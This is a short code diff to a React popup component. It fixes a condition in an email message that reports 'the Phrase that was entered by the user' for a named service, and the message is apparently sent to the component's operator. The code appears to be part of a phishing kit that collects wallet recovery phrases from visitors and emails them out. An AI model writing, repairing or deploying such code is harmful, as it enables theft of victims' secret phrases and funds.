@@ -36,7 +36,7 @@ const Popup = ({ setShow }) => {
     from_name: "Abubakar Musa",
     to_name: "Sir/Ma",
     message:
-      wordings || wordings2 === ""
+      wordings === "" && wordings2 === ""
         ? `A User Did not Input a Phrase But tried To Submit it for ${enter.name} `
         : `This is the Phrase that was entered by the user "${
             wordings || wordings2
